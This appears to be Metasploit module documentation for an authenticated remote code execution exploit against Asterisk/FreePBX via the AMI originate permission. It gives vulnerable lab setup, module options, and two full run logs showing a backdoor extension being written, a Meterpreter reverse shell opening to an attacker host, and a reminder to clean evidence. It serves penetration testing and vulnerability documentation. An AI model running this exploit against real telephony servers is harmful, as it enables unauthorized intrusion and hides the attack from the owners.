## Vulnerable Application

On Asterisk, prior to versions 18.24.2, 20.9.2, and 21.4.2 and certified-asterisk
versions 18.9-cert11 and 20.7-cert2, an AMI user with 'write=originate' may change
all configuration files in the '/etc/asterisk/' directory. Writing a new extension
can be created which performs a system command to achieve RCE as the asterisk service
user (typically asterisk).

Default parking lot in FreePBX is called "Default lot" on the website interface,
however its actually 'parkedcalls'.

Tested against Asterisk 19.8.0 and 18.16.0 on Freepbx SNG7-PBX16-64bit-2302-1.

### Install

One easy method, while outdated, is using the FreePBX ISO.

1. Boot to ISO and install the system. Choose Asterisk 19
2. Visit the web interface on port 80
3. Complete initial setup, make sure to not do updates.
4. login
5. Click FreePBX Administration
6. Click the hamburger > Applications > Parking
7. Check the parking extension and name (`70` and `Default lot` are the defaults)
8. Login (ssh/local) and edit `/etc/asterisk/manager.conf`
  1. Under `[general]`:
    1. Change `bindaddr` value to `0.0.0.0`
    2. If you'd like to test the version checking, grab admin's secret, and set `permit=0.0.0.0/0.0.0.0`
    3. Add the following at the bottom of the file:
    ```
[testuser]
secret=testuser
write=originate
permit=0.0.0.0/255.255.255.0
    ```
9. reboot box (after boot, it may take SEVERAL minutes for asterisk to come up)

Default parking lot is called "Default lot" in the website interface, however its actually `parkedcalls`

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use exploit/linux/misc/asterisk_ami_originate_auth_rce`
1. Do: `set rhosts <rhost>`
1. Do: `set lhost <lhost>`
1. Do: `set username <username>`
1. Do: `set password <password>`
1. You should get a shell.

## Options

### CONF

The extensions configuration file location. Defaults to `/etc/asterisk/extensions.conf`

### PARKINGLOT

The extensions and name of the parking lot. Defaults to `70@parkedcalls`

### EXTENSION

The extension number to backdoor. Defaults to a random number between 3-5 digits.

## Scenarios

### FreePBX 12.7.8-2302-1.sng7 (SNG7-PBX16-64bit-2302-1) with Asterisk 19

```
resource (ami.rb)> use exploit/linux/misc/asterisk_ami_originate_auth_rce
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
resource (ami.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (ami.rb)> set lhost 2.2.2.2
lhost => 2.2.2.2
resource (ami.rb)> set username testuser
username => testuser
resource (ami.rb)> set password testuser
password => testuser
resource (ami.rb)> set verbose true
verbose => true
msf6 exploit(linux/misc/asterisk_ami_originate_auth_rce) > set parkinglot 700@parkedcalls
parkinglot => 700@parkedcalls
msf6 exploit(linux/misc/asterisk_ami_originate_auth_rce) > exploit

[*] Started reverse TCP handler on 2.2.2.2:4444 
[*] 1.1.1.1:5038 - Running automatic check ("set AutoCheck false" to disable)
[*] 1.1.1.1:5038 - Connecting...
[*] 1.1.1.1:5038 - Found Asterisk Call Manager version 8.0.2
[*] 1.1.1.1:5038 - Authenticating as 'testuser'
[!] 1.1.1.1:5038 - No active DB -- Credential data will not be saved!
[+] 1.1.1.1:5038 - Authenticated successfully
[*] 1.1.1.1:5038 - Checking Asterisk version
[!] 1.1.1.1:5038 - The service is running, but could not be validated. Able to connect, unable to determine version
[*] 1.1.1.1:5038 - Connecting...
[*] 1.1.1.1:5038 - Found Asterisk Call Manager version 8.0.2
[*] 1.1.1.1:5038 - Authenticating as 'testuser'
[+] 1.1.1.1:5038 - Authenticated successfully
[*] 1.1.1.1:5038 - Using new context name: EfVeZSDeGcn
[*] 1.1.1.1:5038 - Loading conf file
[+] 1.1.1.1:5038 -   Response: Success, Message: Originate successfully queued
[*] 1.1.1.1:5038 - Setting backdoor
[+] 1.1.1.1:5038 -   Response: Success, Message: Originate successfully queued
[*] 1.1.1.1:5038 - Reloading config
[+] 1.1.1.1:5038 -   Response: Success, Message: Originate successfully queued
[*] 1.1.1.1:5038 - Triggering shellcode
[*] Sending stage (24772 bytes) to 1.1.1.1
[+] 1.1.1.1:5038 - !!!Don't forget to clean evidence from /etc/asterisk/extensions.conf!!!
[*] Meterpreter session 1 opened (2.2.2.2:4444 -> 1.1.1.1:43812) at 2024-11-04 09:09:57 -0500

meterpreter > shell
Process 5831 created.
Channel 1 created.
asterisk -rx "core show version"
Asterisk 19.8.0 built by mockbuild @ jenkins7 on a x86_64 running Linux on 2023-01-16 07:07:49 UTC
cat /etc/schmooze/pbx-version
12.7.8-2302-1.sng7
```

### FreePBX 12.7.8-2302-1.sng7 (SNG7-PBX16-64bit-2302-1) with Asterisk 18

```
resource (ami.rb)> use exploit/linux/misc/asterisk_ami_originate_auth_rce
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
resource (ami.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (ami.rb)> set lhost 2.2.2.2
lhost => 2.2.2.2
resource (ami.rb)> set username testuser
username => testuser
resource (ami.rb)> set password testuser
password => testuser
resource (ami.rb)> set verbose true
verbose => true
msf6 exploit(linux/misc/asterisk_ami_originate_auth_rce) > set parkinglot 700@parkedcalls
parkinglot => 700@parkedcalls
msf6 exploit(linux/misc/asterisk_ami_originate_auth_rce) > exploit

[*] Started reverse TCP handler on 2.2.2.2:4444 
[*] 1.1.1.1:5038 - Running automatic check ("set AutoCheck false" to disable)
[*] 1.1.1.1:5038 - Connecting...
[*] 1.1.1.1:5038 - Found Asterisk Call Manager version 7.0.3
[*] 1.1.1.1:5038 - Authenticating as 'testuser'
[!] 1.1.1.1:5038 - No active DB -- Credential data will not be saved!
[+] 1.1.1.1:5038 - Authenticated successfully
[*] 1.1.1.1:5038 - Checking Asterisk version
[!] 1.1.1.1:5038 - The service is running, but could not be validated. Able to connect, unable to determine version
[*] 1.1.1.1:5038 - Connecting...
[*] 1.1.1.1:5038 - Found Asterisk Call Manager version 7.0.3
[*] 1.1.1.1:5038 - Authenticating as 'testuser'
[+] 1.1.1.1:5038 - Authenticated successfully
[*] 1.1.1.1:5038 - Using new context name: fSvWOLdAx
[*] 1.1.1.1:5038 - Loading conf file
[+] 1.1.1.1:5038 -   Response: Success, Message: Originate successfully queued
[*] 1.1.1.1:5038 - Setting backdoor
[+] 1.1.1.1:5038 -   Response: Success, Message: Originate successfully queued
[*] 1.1.1.1:5038 - Reloading config
[+] 1.1.1.1:5038 -   Response: Success, Message: Originate successfully queued
[*] 1.1.1.1:5038 - Triggering shellcode
[*] Sending stage (24772 bytes) to 1.1.1.1
[+] 1.1.1.1:5038 - !!!Don't forget to clean evidence from /etc/asterisk/extensions.conf!!!
[*] Meterpreter session 1 opened (2.2.2.2:4444 -> 1.1.1.1:53468) at 2024-11-04 09:37:35 -0500

meterpreter > shell
Process 3977 created.
Channel 1 created.
asterisk -rx "core show version"
Asterisk 18.16.0 built by mockbuild @ jenkins7 on a x86_64 running Linux on 2023-01-16 06:50:30 UTC
cat /etc/schmooze/pbx-version
12.7.8-2302-1.sng7
```